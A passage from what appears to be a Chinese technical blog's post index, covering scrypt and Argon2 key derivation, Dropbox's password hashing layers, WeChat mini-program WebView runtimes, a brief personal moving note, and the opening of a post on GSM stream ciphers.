RFC7914.</span><br><span class=\"line\">   Output:</span><br><span class=\"line\">      DerivedKey:                Bytes    array of bytes, DesiredKeyLen <span class=\"type\">long</span></span><br><span class=\"line\"></span><br><span class=\"line\">   Step <span class=\"number\">1.</span> Generate expensive salt</span><br><span class=\"line\">   blockSize ← <span class=\"number\">128</span>*BlockSizeFactor  <span class=\"comment\">// Length (in bytes) of the SMix mixing function output (e.g. 128*8 = 1024 bytes)</span></span><br><span class=\"line\"></span><br><span class=\"line\">   Use PBKDF2 to generate initial <span class=\"number\">128</span>*BlockSizeFactor*p bytes of <span class=\"title function_\">data</span> <span class=\"params\">(e.g. <span class=\"number\">128</span>*<span class=\"number\">8</span>*<span class=\"number\">3</span> = <span class=\"number\">3072</span> bytes)</span></span><br><span class=\"line\">   Treat the result as an array of p elements, each entry being blocksize <span class=\"title function_\">bytes</span> <span class=\"params\">(e.g. <span class=\"number\">3</span> elements, each <span class=\"number\">1024</span> bytes)</span></span><br><span class=\"line\">   [B0...Bp−<span class=\"number\">1</span>] ← PBKDF2HMAC-SHA256(Passphrase, Salt, <span class=\"number\">1</span>, blockSize*ParallelizationFactor)</span><br><span class=\"line\"></span><br><span class=\"line\">   Mix each block in B Costfactor times using ROMix <span class=\"title function_\">function</span> <span class=\"params\">(each block can be mixed in parallel)</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to p-<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">      Bi ← ROMix(Bi, CostFactor)</span><br><span class=\"line\"></span><br><span class=\"line\">   All the elements of B is our <span class=\"keyword\">new</span> <span class=\"string\">&quot;expensive&quot;</span> salt</span><br><span class=\"line\">   expensiveSalt ← B0∥B1∥B2∥ ... ∥Bp-<span class=\"number\">1</span>  <span class=\"comment\">// where ∥ is concatenation</span></span><br><span class=\"line\"> </span><br><span class=\"line\">   Step <span class=\"number\">2.</span> Use PBKDF2 to generate the desired number of bytes, but using the expensive salt we just generated</span><br><span class=\"line\">   <span class=\"keyword\">return</span> PBKDF2HMAC-SHA256(Passphrase, expensiveSalt, <span class=\"number\">1</span>, DesiredKeyLen);</span><br><span class=\"line\"></span><br><span class=\"line\">Function <span class=\"title function_\">ROMix</span><span class=\"params\">(Block, Iterations)</span></span><br><span class=\"line\"></span><br><span class=\"line\">Create Iterations copies of X</span><br><span class=\"line\">X ← Block</span><br><span class=\"line\"><span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to Iterations−<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">   Vi ← X</span><br><span class=\"line\">   X ← BlockMix(X)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to Iterations−<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">   j ← Integerify(X) mod Iterations </span><br><span class=\"line\">   X ← BlockMix(X xor Vj)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> X</span><br><span class=\"line\"></span><br><span class=\"line\">Function <span class=\"title function_\">BlockMix</span><span class=\"params\">(B)</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">   The block B is r <span class=\"number\">128</span>-<span class=\"type\">byte</span> <span class=\"title function_\">chunks</span> <span class=\"params\">(which is equivalent of 2r <span class=\"number\">64</span>-<span class=\"type\">byte</span> chunks)</span></span><br><span class=\"line\">   r ← Length(B) / <span class=\"number\">128</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   Treat B as an array of 2r <span class=\"number\">64</span>-<span class=\"type\">byte</span> chunks</span><br><span class=\"line\">   [B0...B2r-<span class=\"number\">1</span>] ← B</span><br><span class=\"line\"></span><br><span class=\"line\">   X ← B2r−<span class=\"number\">1</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> i ← <span class=\"number\">0</span> to 2r−<span class=\"number\">1</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">      X ← Salsa20/<span class=\"number\">8</span>(X xor Bi)  <span class=\"comment\">// Salsa20/8 hashes from 64-bytes to 64-bytes</span></span><br><span class=\"line\">      Yi ← X</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> ← Y0∥Y2∥...∥Y2r−<span class=\"number\">2</span> ∥ Y1∥Y3∥...∥Y2r−<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>Scrypt被用在很多新的POW的虚拟货币中，用以表示他们挖矿程序的公平性，比如Tenebrix、 Litecoin 和 Dogecoin等。据说以太坊的 PoW 共识算法也是利用 Scrypt 实现的，但事实上以太坊自己实现了一套哈希算法，叫做 Ethash 。</p>\n<blockquote>\n<p>Scrypt 是一种资源消耗型的算法，但可以灵活地设定使用的内存大小</p>\n</blockquote>\n<h3 id=\"5-Argon2（氩-18号元素）\"><a href=\"#5-Argon2（氩-18号元素）\" class=\"headerlink\" title=\"5. Argon2（氩-18号元素）\"></a>5. Argon2（氩-18号元素）</h3><p>2013 年，NIST（美国国家标准与技术研究院）举办了密码散列竞赛，宣布将选择一种新的标准算法，2015 年 Argon2 被宣布为最终获胜者，其他四种算法获得了特别认可：Catena、Lyra2、Makwa 和 yescrypt。</p>\n<p>Argon2 的设计目标是实现最高的内存填充率和多个计算单元的有效使用，同时仍然提供对（GPU）权衡攻击的防御。<br>Argon2 基于 AES 实现，现代的 x64 和 ARM 处理器已经在指令集扩展中实现了它，从而大大缩小了普通系统和攻击者系统之间的性能差距。</p>\n<p>Argon2 具有三个变体：Argon2i、Argon2d 和 Argon2id。</p>\n<ul>\n<li>Argon2d：速度最快，并且使用依赖于数据的内存访问，是对抗侧信道攻击的最安全选择，适用于加密货币等场景</li>\n<li>Argon2i：使用与数据无关的内存访问，速度最慢，内存消耗高，是抵抗 GPU 破解攻击的最安全选择，适用于密钥派生等场景</li>\n<li>Argon2id：是 Argon2i 和 Argon2d 的混合体，使用了数据依赖和数据无关的内存访问的组合</li>\n</ul>\n<p>下图是最简单的，非并行的Argon2的算法流程。<br><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/argon2.png\" alt=\"Argon2\"><br>以下是使用方法的示例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Inputs</span>:</span><br><span class=\"line\">   password (P):       <span class=\"title class_\">Bytes</span> (<span class=\"number\">0.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    需要加密的原始信息P</span><br><span class=\"line\">   salt (S):           <span class=\"title class_\">Bytes</span> (<span class=\"number\">8.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    <span class=\"title class_\">Salt</span>盐，建议<span class=\"number\">16</span>个字节</span><br><span class=\"line\">   parallelism (p):    <span class=\"title class_\">Number</span> (<span class=\"number\">1.</span><span class=\"number\">.224</span>-<span class=\"number\">1</span>)   并行程度p，表示同时可以有多少独立的计算链同时运行</span><br><span class=\"line\">   tagLength (T):      <span class=\"title class_\">Number</span> (<span class=\"number\">4.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)   指定返回的<span class=\"title class_\">Tag</span>密文长度</span><br><span class=\"line\">   memorySizeKB (m):   <span class=\"title class_\">Number</span> (8p.<span class=\"number\">.232</span>-<span class=\"number\">1</span>)  内存大小, 单位是<span class=\"variable constant_\">MB</span></span><br><span class=\"line\">   iterations (t):     <span class=\"title class_\">Number</span> (<span class=\"number\">1.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)   迭代器的个数t，用于提升运行速度</span><br><span class=\"line\">   version (v):        <span class=\"title class_\">Number</span> (<span class=\"number\">0x13</span>)       版本号v，一个字节，取值<span class=\"number\">0x13</span></span><br><span class=\"line\">   key (K):            <span class=\"title class_\">Bytes</span> (<span class=\"number\">0.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    可选的，安全值key (<span class=\"title class_\">Errata</span>: <span class=\"variable constant_\">PDF</span> says <span class=\"number\">0.</span><span class=\"number\">.32</span> bytes, <span class=\"variable constant_\">RFC</span> says <span class=\"number\">0.</span><span class=\"number\">.232</span> bytes)</span><br><span class=\"line\">   associatedData (X): <span class=\"title class_\">Bytes</span> (<span class=\"number\">0.</span><span class=\"number\">.232</span>-<span class=\"number\">1</span>)    可选的，附件数据</span><br><span class=\"line\">   hashType (y):       <span class=\"title class_\">Number</span> (<span class=\"number\">0</span>=<span class=\"title class_\">Argon2</span>d, <span class=\"number\">1</span>=<span class=\"title class_\">Argon2</span>i, <span class=\"number\">2</span>=<span class=\"title class_\">Argon2</span>id)  <span class=\"title class_\">Argon2</span>的类型</span><br><span class=\"line\"><span class=\"title class_\">Output</span>:</span><br><span class=\"line\">   <span class=\"attr\">tag</span>:                <span class=\"title class_\">Bytes</span> (tagLength)   运算结算密文, 长度是tagLength</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、典型案例：Dropbox-的三层加密策略\"><a href=\"#四、典型案例：Dropbox-的三层加密策略\" class=\"headerlink\" title=\"四、典型案例：Dropbox 的三层加密策略\"></a>四、典型案例：Dropbox 的三层加密策略</h2><p>Dropbox 公司曾公开分享过自己对用户账号的密码加密的策略，使用了三层加密，从里到外就像洋葱一样层层叠加。<br><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/dropbox.png\" alt=\"Dropbox\"></p>\n<ol>\n<li>首先，对明文密码使用 SHA512 散列算法，得到固定长度的 512 字节散列值。<br>某些 Bcrypt 实现可能默认散列值长度为 72 字节，从而降低了密码的熵值；而有的则允许变长密码，容易受到 DoS 攻击。</li>\n<li>然后，针对散列值进行 Bcrypt 再次散列，每个密码都有不同的“盐”，并且是分开存储的<br>Bcrypt 速度比较慢，这样就很难通过硬件加速来加快破解速度。<br>Bcrypt 散列使用了成本因子 10（每个因子相当于每一步计算需要耗费 100 毫秒的时间），这样就更是加大了暴力破解的难度。</li>\n<li>最后，散列值会再次经过 AES256 算法的加密，这次加密会使用到对称秘钥，也就是所谓的“胡椒粉”（pepper）。<br>pepper 与账号数据库分开存储，但所有账号的pepper都是统一的</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.ujcms.com/knowledge/509.html\">密码加密存储技术详解</a></li>\n<li><a href=\"https://www.tomczhen.com/2016/10/10/hashing-security/\">加盐密码哈希：如何正确使用</a></li>\n<li><a href=\"https://blog.csdn.net/HORHEART/article/details/119968850\">PBKDF2算法原理</a></li>\n<li><a href=\"https://crackstation.net/hashing-security.htm\">Salted Password Hashing - Doing it Right</a></li>\n<li><a href=\"https://www.ujcms.com/knowledge/509.html\">密码加密存储技术详解</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1888720\">密码学系列之:加密货币中的scrypt算法</a></li>\n<li><a href=\"http://www.tarsnap.com/scrypt/scrypt.pdf\">Colin Percival 关于 Scrypt 的原始论文</a></li>\n<li><a href=\"https://www.rfc-editor.org/rfc/rfc7914\">Scrypt - RFC 7914 官方文档</a></li>\n<li><a href=\"https://github.com/P-H-C/phc-winner-argon2/blob/master/argon2-specs.pdf\">Argon2 的技术白皮书 - 英文</a></li>\n<li><a href=\"https://github.com/p-h-c/phc-winner-argon2\">Argon2 的参考 C 实现 - Github</a></li>\n<li><a href=\"https://www.11meigui.com/2020/rainbow-table.html\">什么是彩虹表 Rainbow Table</a></li>\n<li><a href=\"https://www.comparitech.com/blog/information-security/key-derivation-function-kdf/\">KDF是怎么工作的？- 英文加速</a></li>\n</ul>\n"},{"title":"微信小程序的运行态环境","url":"/2021/02/12/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E6%80%81%E7%8E%AF%E5%A2%83/","content":"<h2 id=\"WebKit的发展历程\"><a href=\"#WebKit的发展历程\" class=\"headerlink\" title=\"WebKit的发展历程\"></a>WebKit的发展历程</h2><blockquote>\n<p>粗略地说，Webkit &#x3D; WebCore + JavaScriptCore， Chromimum &#x3D; Blink + V8</p>\n</blockquote>\n<p>1998，自由软件社区KDE开发了HTML渲染引擎KHTML和JavaScript解析引擎KJS，也就是现代浏览器两个重要的引擎，其中：</p>\n<ul>\n<li>渲染引擎(layout engineer 或者 Rendering Engine)<br>  负责渲染引擎负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。</li>\n<li>JS 引擎<br>  负责解析 Javascript 语言，执行 javascript 语言来实现网页的动态效果。最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。</li>\n</ul>\n<p>当时还存在多个浏览器内核相互竞争，包括：Trident（IE），Gecko（firefox），Webkit（Safari chrome 等）以及 Presto（opera)。</p>\n<p>2001年，Apple公司的开发者Don Melton于在KDE的基础之上开始了WebKit项目，KHTML被命名为<code>WebCore</code>，KJS被命名为<code>JavaScriptCore</code>。因此，对于Apple的产品来说，浏览器内核就是WebKit，即渲染引擎采用的是WebKit内核。</p>\n<p>2008年，Google为发展浏览器<code>Google Chrome</code>而开启了免费开源软件项目<code>Chromium</code>，其JavaScript解析引擎采用Google自己开发的大名鼎鼎的<code>V8</code>引擎，渲染引擎仍然采用WebKit内核。Google使用<code>Chromium</code>代码来制作其Chrome浏览器，该浏览器比Chromium具有更多功能。。</p>\n<p>2013年，<code>Chromium</code>项目将渲染引擎替换为<code>Blink</code>引擎，并在Chrome28及后续的版本上采用。随后 opera 则放弃了自主研发的 Presto 引擎，投入谷歌怀抱，和谷歌一起研发 blink 引擎，国内各种 chrome系的浏览器（360、UC、QQ、百度等等）也纷纷放弃 webkit，投入 blink 的怀抱。</p>\n<p>2018年，微软宣布Microsoft Edge未来也将基于Chromium开发。</p>\n<img src=\"/2021/02/12/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E6%80%81%E7%8E%AF%E5%A2%83/webkit.gif\" class=\"\">\n\n<h2 id=\"WebView是什么\"><a href=\"#WebView是什么\" class=\"headerlink\" title=\"WebView是什么\"></a>WebView是什么</h2><p>WebView是一个基于webkit引擎、展现web页面的控件，是iOS SDK或Android SDK的一个重要组件，其本质就是一个高性能webkit内核浏览器。</p>\n<p>WebView的功能主要包括：</p>\n<ul>\n<li>显示和渲染Web页面</li>\n<li>直接使用html文件（网络上或本地assets中）作布局</li>\n<li>与JavaScript交互调用</li>\n</ul>\n<h3 id=\"iOS、MacOS的WebView\"><a href=\"#iOS、MacOS的WebView\" class=\"headerlink\" title=\"iOS、MacOS的WebView\"></a>iOS、MacOS的WebView</h3><p>顾名思义，WebView是与浏览器密切相关的开发组件。Apple作为封闭型生态系统，Safri是默认浏览器，iOS APP的WebView也是其强制标准，应用开发者完全没有选择权。</p>\n<ul>\n<li><code>UIWebView</code>是Apple在iOS 2推出的“老”资格页面渲染引擎。</li>\n<li>从iOS 8起，Apple推出了<code>WKWebView</code>，并作为Safri的默认渲染引擎，但开发者也可以通过<code>manifest</code>配置项选择使用<code>UIWebView</code>。</li>\n<li>从iOS 13起，Apple将<code>UIWebView</code>列入非公开api，2020年4月起App Store将不再接受使用UIWebView的新App上架、2020年12月起将不再接受使用UIWebView的App更新。</li>\n</ul>\n<p>相比<code>UIWebView</code>来说，<code>WKWebView</code>的性能更好，节省内存，支持了更多的 HTML5 特性。<br>此外，存在的主要缺陷有：</p>\n<ul>\n<li>不支持websql（iOS8、9上不支持，iOS10恢复支持）</li>\n<li>不支持plus.navigator.setCookie</li>\n<li>不支持webview的overrideresource方法</li>\n<li>不支持js原生加密</li>\n<li>在联网及本地文件读取等有各种跨域限制、</li>\n</ul>\n<h3 id=\"Android终端的WebView\"><a href=\"#Android终端的WebView\" class=\"headerlink\" title=\"Android终端的WebView\"></a>Android终端的WebView</h3><p>Android Webview的进化历史如下：</p>\n<ul>\n<li>Android 4.4以前，自带WebView是Android webkit 内核，很多HTML5标准语法不支持，比如indexeddb、webgl等，canvas性能非常差</li>\n<li>从Android4.4系统开始，自带WebView变成了chromium 30内核，Chromium内核（Blind + V8）取代了Webkit内核</li>\n<li>从Android5.0系统开始，webview脱离ROM可单独更新，成为一个独立的apk，可以不依赖系统而独立存在和更新。</li>\n<li>从Android7.0 系统开始，如果用户手机里安装了 Chrome ， 系统优先选择 Chrome 为应用提供 WebView 渲染。</li>\n<li>从Android8.0系统开始，默认开启WebView多进程模式，即WebView运行在独立的沙盒进程中。</li>\n</ul>\n<p>Android作为开放式生态系统，尽管Chrome是默认浏览器，但由于其内核是Chromium，其开发SDK也能支持第三方Chrome家族浏览器。<br>由于政策环境的影响，几乎所有国产品牌Android都提供自己的浏览器（虽然都是基于Chrominum内核），从chrome 37一直跨度到60，手机用户侧使用了到底是哪个版本是不一定的，因此WebView的运行环境就很复杂了</p>\n<h3 id=\"Window终端的WebView\"><a href=\"#Window终端的WebView\" class=\"headerlink\" title=\"Window终端的WebView\"></a>Window终端的WebView</h3><p>在很长一段时间里，Windows 10用户对 Microsoft Edge 的印象都停留在「Chrome 下载器」这个层面上，即便 Edge 本身相比 Internet Explorer 有着诸多优点，孱弱的扩展生态和巨大的迁移难度还是让不少用户望而却步。</p>\n<p>2018 年年底，基于 Chromium 内核的 Microsoft Edge 正式立项。微软的壳、Chromium 的心， 微软彻底放弃自己开发的EdgeHTML内核，解决 Edge 一直以来都难以解决的兼容性问题（在 EdgeHTML 下不少传统网页都无法正常显示）并融入现有的 Chromium 生态。</p>\n<p>因此，Window Client的WebView至此已经与Chromium完全一致了！！！</p>\n<h2 id=\"微信小程序的Runtime\"><a href=\"#微信小程序的Runtime\" class=\"headerlink\" title=\"微信小程序的Runtime\"></a>微信小程序的Runtime</h2><p>小程序无论从技术上还是从理念上都不是一个新事物：从技术上讲，它借用了React Native的一些概念，定义了一套微信自有的组件并根据运行环境的不同（PC、iOS、Android）将这些组件编译&#x2F;转化为对应平台的可运行组件；从理念上讲，百度早年的“轻应用”、QQ右下角的“应用宝”还有支付宝里的各类小服务，早已是小程序的雏形。</p>\n<h3 id=\"小程序的宿主环境\"><a href=\"#小程序的宿主环境\" class=\"headerlink\" title=\"小程序的宿主环境\"></a>小程序的宿主环境</h3><p>小程序的主要开发语言是 JavaScript，其开发模式与 web 开发类似，都是使用 javascript 进行开发，使用 css 控制样式，最终渲染使用 html 进行渲染。</p>\n<p>在小程序中，渲染层通常与逻辑层分离。</p>\n<ul>\n<li>渲染层<br>  <code>WXML</code>模板和<code>WXSS</code>样式工作在渲染层。渲染层的界面使用了WebView 进行渲染。<br>  由于一个小程序通常存在多个界面，所以渲染层可能使用多个WebView线程<br>  View 负责渲染小程序页面，包括 Web 组件和原生组件渲染，可以将其视为混合渲染。例如，Web 组件渲染可以由 WebView 处理，但 WebView 不支持某些 Web 组件渲染，或者是性能受限；小程序还依赖于某些原生组件，例如地图、视频等。</li>\n<li>逻辑层<br>  <code>JavaScript</code> 脚本工作在逻辑层，采用<code>JsCore</code>线程运行JS脚本。<br>  Service 是用主要用于执行小程序的 JS 逻辑。主要负责小程序的事件处理、API 调用和生命周期管理。扩展的原生功能通常来自宿主原生应用程序或操作系统，这些功能包括拍照、位置、蓝牙、网络状态、文件处理、扫描、电话等。它们通过某些 API 调用。当小程序调用原生 API 时，它会将 API 调用传递给扩展的原生功能，以便通过 JSBridge 进一步处理，并通过 JSBridge 从扩展的原生功能获取结果。Service 为每个 Render 建立连接，传输需要渲染的数据以进一步处理。</li>\n</ul>\n<img src=\"/2021/02/12/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E6%80%81%E7%8E%AF%E5%A2%83/runtime.png\" class=\"\">\n\n<p>视图层和逻辑层分离，两个线程的通信会经由微信客户端（下文中也会采用Native来代指微信客户端）做中转，这种结构有很多好处：</p>\n<ul>\n<li>方便多个小程序页面之间的数据共享和交互。</li>\n<li>在小程序的生命周期中具有相同的上下文可以为具备原生应用程序开发背景的开发人员提供熟悉的编码体验。</li>\n<li>Service 和 View 的分离和并行实现可以防止 JS 执行影响或减慢页面渲染，这有助于提高渲染性能。</li>\n<li>因为 JS 在 Service 层执行，所以 JS 里面操作的 DOM 将不会对 View 层产生影响，所以<strong>小程序是不能操作DOM结构的</strong>，这也就使得小程序的性能比传统的 H5 更好。</li>\n</ul>\n<h3 id=\"jsCore的运行环境\"><a href=\"#jsCore的运行环境\" class=\"headerlink\" title=\"jsCore的运行环境\"></a>jsCore的运行环境</h3><p>微信小程序可以运行在多种平台上：iOS（iPhone&#x2F;iPad）微信客户端、Android 微信客户端、PC 微信客户端、Mac 微信客户端和用于调试的微信开发者工具。</p>\n<p>各平台脚本执行环境以及用于渲染非原生组件的环境是各不相同的：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">运行平台</th>\n<th align=\"center\">页面渲染引擎</th>\n<th align=\"center\">JS解析引擎</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">iOS APP</td>\n<td align=\"center\">WKWebView</td>\n<td align=\"center\">JavaScriptCore</td>\n<td align=\"center\">Apple的强制标准</td>\n</tr>\n<tr>\n<td align=\"center\">Android APP</td>\n<td align=\"center\">腾讯自研XWeb</td>\n<td align=\"center\">V8</td>\n<td align=\"center\">基于BOM的碎片化问题</td>\n</tr>\n<tr>\n<td align=\"center\">MacOS Client</td>\n<td align=\"center\">WKWebView</td>\n<td align=\"center\">JavaScriptCore</td>\n<td align=\"center\">与iOS完全一致</td>\n</tr>\n<tr>\n<td align=\"center\">Window Client</td>\n<td align=\"center\">Chrome</td>\n<td align=\"center\">Chrome</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">开发者工具</td>\n<td align=\"center\">Chromium Webview</td>\n<td align=\"center\">NW.js</td>\n<td align=\"center\">自定义</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>node-webkit（NW.js），是node.js和webkit的结合体，webkit提供DOM操作，node.js提供本地化操作；且将二者的context完全整合，可在HTML代码中直接使用node.js的API。</p>\n</blockquote>\n<p>微信、支付宝、头条等头部APP纷纷打造自己的小程序生态，基本方案都是基于chromium改造的浏览器内核，但基线版本有所不同，例如支付宝基于chrome 57&#x2F;69等版本，百度基于chrome 63，头条基于Chrome 62等。</p>\n<h3 id=\"X5-渲染引擎\"><a href=\"#X5-渲染引擎\" class=\"headerlink\" title=\"X5 渲染引擎\"></a>X5 渲染引擎</h3><p>腾讯浏览服务是致力于优化移动端webview体验的整套解决方案。该方案由SDK、手机QQ浏览器X5内核和X5云端服务组成，腾讯X5内核在腾讯家的很多产品使用，包括微信，QQ，QQ浏览器。</p>\n<p>腾讯浏览服务 TBS 在 2.3 版本中，其 X5 内核就是基于 Android 5.0 WebView Blink内核（M37版本）定制优化。</p>\n<p>从微信6.1版本起，android用户全部使用的QQ浏览器的X5内核。</p>\n<blockquote>\n<p>5.4-6.1之间的版本，若用户安装了QQ浏览器就是使用的X5内核，若用户未安装浏览器，使用的是系统默认内核。</p>\n</blockquote>\n<p>x5浏览器内核的UA特征字符串是：<code>Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044903</code></p>\n<h3 id=\"XWeb-渲染引擎\"><a href=\"#XWeb-渲染引擎\" class=\"headerlink\" title=\"XWeb 渲染引擎\"></a>XWeb 渲染引擎</h3><p>大概从2020年起，微信团队放弃了X5内核，自研并默认更换为XWeb内核，其UA特征字符串是：<code>Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190506</code></p>\n<p>同时，JS引擎也从基于 Mobile Chrome 57 内核的X5，改为基于 Mobile Chrome 67 内核的V8引擎。</p>\n<p>恭喜微信团队，终于回到了Google标准的道路！！！</p>\n<hr>\n<h2 id=\"附录一：关于如何查看Android手机端webview的版本\"><a href=\"#附录一：关于如何查看Android手机端webview的版本\" class=\"headerlink\" title=\"附录一：关于如何查看Android手机端webview的版本\"></a>附录一：关于如何查看Android手机端webview的版本</h2><ol>\n<li>日志里查ua</li>\n<li>在系统设置里找到所有应用，显示隐藏系统进程，在里面找到Android system webview，显示的版本即为chrome版本。</li>\n</ol>\n<ul>\n<li><p>Android手机默认浏览器和webview的区别<br>国外品牌的安卓手机，自带浏览器就是chrome。而国内安卓手机，自带浏览器大多是QQ浏览器、UC浏览器的贴牌，极个别是自己改造chromium。<br>所以手机自带的浏览器并不等于webview，在一个平台可运行，不代表另一个平台可兼容。<br>QQ、UC、360等浏览器也基本是基于chromium做改造，不同版本的浏览器其使用的chromium内核版本也不一样。具体可以打印ua查看。<br>注意夜神等安卓模拟器的Android版本是4.4，很多新语法都不支持。</p>\n</li>\n<li><p>如果你有影响用户的能力，为了给用户更好的体验，可以引导Android用户安装最新版Android system webview。应用宝、华为、金立等应用市场均可下载这个apk，或者翻墙到google play store。<br>在华为、小米、金立手机上，wifi下会自动更新Android system webview。<br>尤其是有些Android5用户使用的Android system webview 37版本，有硬件加速bug，闪屏花屏，此时升级webview即可解决。</p>\n</li>\n<li><p>有人问可否在打包时直接集成新版Android system webview，减少浏览器兼容问题？<br>webview体积至少50M起，体积实在太大了。有兴趣的开发者可以自己研究离线打包。<br>倒是可以这样：js里判断当前手机是Android5以上，且webview版本过低，比如低于40（ua可以判断），可以提醒用户是否升级webview，然后引导用户去之前贴出的地址下载更新webview。<br>但不管怎么样，尽量少写可能遇到兼容性问题的代码。</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://developers.weixin.qq.com/miniprogram/dev/framework/MINA.html\">微信小程序的开发指南</a></li>\n<li><a href=\"https://microapp.bytedance.com/docs/zh-CN/mini-app/develop/framework/basic-reference/catalog-structure\">字节跳的小程序的开发指南</a></li>\n<li><a href=\"https://x5.tencent.com/docs/index.html\">腾讯浏览服务TBS的官方网站</a></li>\n<li><a href=\"https://nwjs.io/\">NW.js的官方主页</a></li>\n<li><a href=\"https://course.talelin.com/lin/lin-ui/\">微信小程序的优秀教材</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2020/10/wechat-miniprogram-tutorial-part-one.html\">阮一峰—微信小程序入门教程</a></li>\n<li><a href=\"https://www.cnblogs.com/chris-oil/p/12866317.html\">关于手机webview内核的兼容性</a></li>\n<li><a href=\"https://ask.dcloud.net.cn/article/36348\">Appstore审核反馈废弃UIWebview APIs问题的说明</a></li>\n<li><a href=\"https://www.jianshu.com/p/2a14d303308d\">X5 浏览器内核调研报告</a></li>\n<li><a href=\"https://blog.csdn.net/typename/article/details/40425275\">Android 各个版本WebView的技术架构</a></li>\n</ul>\n"},{"title":"搬家了","url":"/2019/01/17/%E6%90%AC%E5%AE%B6%E4%BA%86/","content":"<p>已经是2019年了！<br>从兰州搬家，终于回到了北京！</p>\n<p>阿里云的香港ECS到期了，续费太贵，就把域名搬到了成都的腾讯云！<br>效果还不错，就是不得不做了域名备案。</p>\n"},{"title":"流密码算法的硬件实现-以GSM网络的A5算法为例","url":"/2022/12/23/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-%E4%BB%A5GSM%E7%BD%91%E7%BB%9C%E7%9A%84A5%E7%AE%97%E6%B3%95%E4%B8%BA%E4%BE%8B/","content":"<p>1917 年, Vernam 密码体制被提出, 后来 Mauborgne 提出了改进方案, 即 “一次一密” 密码体制。<br>1949 年, Shannon 证明 “一次一密” 密码体制具备完全的理论安全性，但必须满足三个条件：</p>\n<ul>\n<li>密钥流必须完全随机生成</li>\n<li>密钥长度至少与明文相同</li>\n<li>密钥不能重复使用</li>\n</ul>\n<p>这些限制条件在实际应用中存在很大困难，而且密钥的生成、分配和管理也是不容忽视的问题，因此科学家设计了各种流密码（Stream cipher，也称为流加密）算法来代替 “一次一密” 体制，其基本特征是：</p>\n<ul>\n<li>作为一种对称加密算法，加密和解密双方使用相同的伪随机加密数据流（pseudo-random stream）作为密钥流（Keystream）</li>\n<li>明文数据（Plaintext）按 bit 位与密钥流<strong>顺次</strong>对应执行异或（XOR）操作，得到密文数据流（Cipertext）</li>\n</ul>\n<p>为了提高处理性能，伪随机密钥流（keystream）通常由一个随机的种子（seed）通过 PRG 算法（pseudo-random generator）生成，即由较短的数据流通过特定算法得到较长的密钥流，因此 PRG 算法的不可预测性成为确保流加密安全性的关键问题。</p>\n<h2 id=\"一、GSM-安全体系\"><a href=\"#一、GSM-安全体系\" class=\"headerlink\" title=\"一、GSM 安全体系\"></a>一、GSM 安全体系</h2><p>GSM 的安全性基于对称密钥的加密体系，定义了三种加密算法：</p>\n<ul>\n<li>A3：用于移动设备到 GSM 网络认证的算法，负责生成认证码 SRES</li>\n<li>A5：用于认证成功后加密语音和数据的算法，负责生成会话密钥（一次一密）</li>\n<li>A8：用于产生对称密钥的密钥生成算法，负责生成通信密钥 Kc</li>\n</ul>\n<p>SIM 是 GSM 终端的关键安全载体，负责实现 A3 和 A8 算法，并负责持久化存储核心数据：</p>\n<ul>\n<li>IMSI：SIM 卡的全球唯一的标志号。手机在开机时，一次性从卡里面读出并发给移动网络，鉴权成功后生成并对外提供 